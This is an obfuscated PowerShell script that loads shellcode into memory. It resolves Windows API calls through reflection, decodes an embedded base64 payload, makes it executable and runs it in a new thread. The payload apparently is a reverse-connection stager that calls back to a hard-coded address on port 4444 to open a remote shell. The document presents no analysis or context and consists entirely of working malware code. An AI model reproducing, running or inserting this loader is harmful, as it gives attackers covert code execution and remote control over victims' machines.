function taq {
        Param ($cW, $bT_)
        $kFYFr = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $kFYFr.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($kFYFr.GetMethod('GetModuleHandle')).Invoke($null, @($cW)))), $bT_))
}

function u5PM {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $l26,
                [Parameter(Position = 1)] [Type] $m8l = [Void]
        )

        $iBbb = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $iBbb.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $l26).SetImplementationFlags('Runtime, Managed')
        $iBbb.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $m8l, $l26).SetImplementationFlags('Runtime, Managed')

        return $iBbb.CreateType()
}

[Byte[]]$iUa = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUWVIi1JgVkiLUhhIi1IgTTHJSA+3SkpIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBQi0gYSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKgBDEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$nn = 0
$xbQeJ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((taq kernel32.dll VirtualAlloc), (u5PM @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $iUa.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($iUa, 0, $xbQeJ, $iUa.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((taq kernel32.dll VirtualProtect), (u5PM @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($xbQeJ, [Uint32]$iUa.Length, 0x10, [Ref]$nn)) -eq $true) {
        $lr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((taq kernel32.dll CreateThread), (u5PM @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$xbQeJ,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((taq kernel32.dll WaitForSingleObject), (u5PM @([IntPtr], [Int32]))).Invoke($lr,0xffffffff) | Out-Null
}
